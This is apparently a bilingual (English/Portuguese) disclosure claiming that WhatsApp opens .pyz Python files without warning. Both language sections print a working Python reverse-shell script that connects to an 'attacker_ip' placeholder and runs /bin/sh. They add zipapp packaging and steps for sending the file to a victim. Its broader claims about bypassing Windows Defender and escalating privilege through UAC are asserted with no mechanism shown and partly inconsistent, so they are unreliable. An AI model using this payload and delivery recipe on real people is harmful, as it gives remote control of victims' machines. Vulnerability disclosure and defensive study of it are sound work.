# Vulnerability in WhatsApp: Malware Execution via Python File (.pyz)

## Description

This critical vulnerability in WhatsApp allows for the automatic execution of malicious files with the `.pyz` (Python) extension. An attacker can send a malicious `.pyz` file via WhatsApp, and when the victim clicks to open it, the file is executed without any notification or confirmation. This results in the possibility of executing a reverse shell or even privilege escalation. Even on a guest user profile, the malware can escalate to administrative privileges by exploiting flaws in Windows UAC.

## Steps to Reproduce

### Procedure

1. **Creating the Malicious File**:
   - Create a Python script that opens a reverse shell.
   - Example Python script for reverse shell:
     ```python
     import socket, subprocess, os
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("attacker_ip", attacker_port))
     os.dup2(s.fileno(), 0)
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
     p = subprocess.call(["/bin/sh", "-i"])
     ```

2. **Packaging into `.pyz`**:
   - Use `zipapp` to create the `.pyz` file:
     ```bash
     python -m zipapp reverse_shell.py -o reverse_shell.pyz
     ```

3. **Sending via WhatsApp**:
   - Send the `.pyz` file to the victim through WhatsApp.

4. **Execution by the Victim**:
   - The victim opens the `.pyz` file without receiving any warning or confirmation.
   - The malware is executed automatically, establishing the reverse shell.

## Technical Explanation

### Behavior of the `.pyz` File

- **`.pyz` Files**: These are zipped files that contain Python scripts. They are directly executable by the Python interpreter without needing manual extraction.
- **Ease of Execution**: `.pyz` files are simple to create and execute, making them a convenient choice for delivering malicious payloads.
- **Security Bypass**: The ability to bypass traditional security checks makes these files particularly dangerous.
- **Automatic Execution**: These files bypass many typical security checks, such as those performed by Windows Defender and UAC, allowing the malicious code to execute unimpeded.

## Impact

The vulnerability allows attackers to gain full control of the victim's machine without interference from security systems. Additionally, it enables privilege escalation, significantly increasing the potential damage.

## Technical Details

### Behavioral Failures

1. **Windows Defender**:
   - **Signature Integrity Verification**: Windows Defender relies on file signatures to identify known malware. However, when the `.pyz` file is sent and opened via WhatsApp, Defender does not adequately verify the signature. This occurs because WhatsApp does not provide sufficient metadata for Defender to identify the file as a threat.
   - **Execution Blocking**: The real-time protection of Windows Defender is bypassed by WhatsApp when opening `.pyz` files, allowing execution without blocking.

2. **UAC (User Account Control)**:
   - **Permission Request**: UAC does not request administrative permission when executing `.pyz` files from WhatsApp. This is due to a failure in the security context integration between WhatsApp and the operating system, where the file is treated as trusted content, allowing privilege escalation.

3. **WhatsApp**:
   - **Security Verification**: WhatsApp does not perform adequate security checks when opening `.pyz` files. This means there is no behavioral analysis of the file before execution, nor integrity or origin verification.
   - **User Notification**: WhatsApp does not implement a security notification or confirmation before executing potentially dangerous files. This leaves users vulnerable to automatic malware executions.

4. **Antivirus Software**:
   - **Malware Detection**: Many antivirus programs rely on real-time scanning and file signatures. However, the execution of `.pyz` files through WhatsApp is not properly intercepted, allowing malware to go undetected.
   - **Payload Blocking**: The execution of malicious payloads establishing remote connections (such as reverse shells) is not blocked when the `.pyz` file is executed via WhatsApp. This is due to a failure in deep packet inspection and network behavior analysis by antivirus programs, especially when the file is initiated by a trusted application like WhatsApp.

## Video Demonstration

Watch the vulnerability demonstration in action:

---

https://github.com/user-attachments/assets/f87fd925-1fa3-467a-8815-e96800562b63

---

# <div align="center"> PT:BR </div>

---

# Vulnerabilidade no WhatsApp: Execução de Malware via Arquivo Python (.pyz)

### Descrição 

Esta vulnerabilidade crítica no WhatsApp permite a execução automática de arquivos maliciosos com extensão `.pyz` (Python). O atacante pode enviar um arquivo `.pyz` malicioso via WhatsApp, e quando a vítima clica para abri-lo, o arquivo é executado sem qualquer notificação ou confirmação. Isso resulta na possibilidade de execução de um reverse shell ou mesmo de elevação de privilégios. Mesmo em um perfil de usuário convidado, o malware pode escalar para privilégios administrativos, explorando falhas no UAC do Windows.


## Steps to Reproduce

### Procedimento

1. **Criação do Arquivo Malicioso**:
   - Crie um script Python que abre um reverse shell.
   - Exemplo de script Python para reverse shell:
     ```python
     import socket, subprocess, os
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("attacker_ip", attacker_port))
     os.dup2(s.fileno(), 0)
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
     p = subprocess.call(["/bin/sh", "-i"])
     ```

2. **Compactação em `.pyz`**:
   - Utilize o `zipapp` para criar o arquivo `.pyz`:
     ```bash
     python -m zipapp reverse_shell.py -o reverse_shell.pyz
     ```

3. **Envio pelo WhatsApp**:
   - Envie o arquivo `.pyz` para a vítima através do WhatsApp.

4. **Execução pela Vítima**:
   - A vítima abre o arquivo `.pyz` sem receber qualquer aviso ou confirmação.
   - O malware é executado automaticamente, estabelecendo o reverse shell.

## Explicação Técnica

### Comportamento do Arquivo `.pyz`

- **Arquivos `.pyz`**: São arquivos zipados que contêm scripts Python. Eles são executáveis diretamente pelo interpretador Python sem a necessidade de descompactação manual.
- **Facilidade de Execução**: Arquivos `.pyz` são simples de criar e executar, tornando-os uma escolha conveniente para a entrega de payloads maliciosos.
- **Bypass de Verificações**: A capacidade de contornar verificações de segurança tradicionais faz com que esses arquivos sejam particularmente perigosos.
- **Execução Automática**: Esses arquivos contornam muitas verificações de segurança típicas, como as realizadas pelo Windows Defender e UAC, permitindo a execução do código malicioso sem impedimentos.

## Impacto

A vulnerabilidade permite que atacantes obtenham controle total da máquina da vítima sem interferência de sistemas de segurança. Além disso, possibilita a elevação de privilégios, ampliando significativamente o potencial de dano.

## Detalhamento Técnico

### Falhas de Comportamento

1. **Windows Defender**:
   - **Verificação de Integridade por Assinatura**: O Windows Defender depende de assinaturas de arquivo para identificar malwares conhecidos. No entanto, quando o arquivo `.pyz` é enviado e aberto através do WhatsApp, o Defender não realiza uma verificação adequada da assinatura. Isso ocorre porque o WhatsApp não fornece metadados suficientes para que o Defender possa identificar o arquivo como uma ameaça.
   - **Bloqueio de Execução**: A proteção em tempo real do Windows Defender é bypassada pelo WhatsApp ao abrir arquivos `.pyz`, permitindo a execução sem bloqueio.

2. **UAC (Controle de Conta de Usuário)**:
   - **Solicitação de Permissão**: O UAC não solicita permissão administrativa ao executar arquivos `.pyz` vindos do WhatsApp. Isso se deve a uma falha na integração de contexto de segurança entre o WhatsApp e o sistema operacional, onde o arquivo é tratado como um conteúdo confiável, permitindo a elevação de privilégios.

3. **WhatsApp**:
   - **Verificação de Segurança**: O WhatsApp não realiza verificações de segurança adequadas ao abrir arquivos `.pyz`. Isso significa que não há análise de comportamento do arquivo antes da execução, nem verificação de integridade ou origem.
   - **Notificação ao Usuário**: O WhatsApp não implementa uma notificação de segurança ou confirmação antes da execução de arquivos potencialmente perigosos. Isso deixa os usuários vulneráveis a execuções automáticas de malware.

4. **Softwares Antivírus**:
   - **Detecção de Malware**: Muitos antivírus dependem de varreduras em tempo real e assinaturas de arquivo. No entanto, a execução de arquivos `.pyz` através do WhatsApp não é devidamente interceptada, permitindo que o malware passe despercebido.
   - **Bloqueio de Payloads**: A execução de payloads maliciosos que estabelecem conexões remotas (como reverse shells) não é bloqueada quando o arquivo `.pyz` é executado via WhatsApp. Isso se deve a uma falha na inspeção profunda de pacotes e comportamentos de rede por parte dos antivírus, especialmente quando o arquivo é iniciado por um aplicativo confiável como o WhatsApp.

---


https://github.com/user-attachments/assets/f87fd925-1fa3-467a-8815-e96800562b63

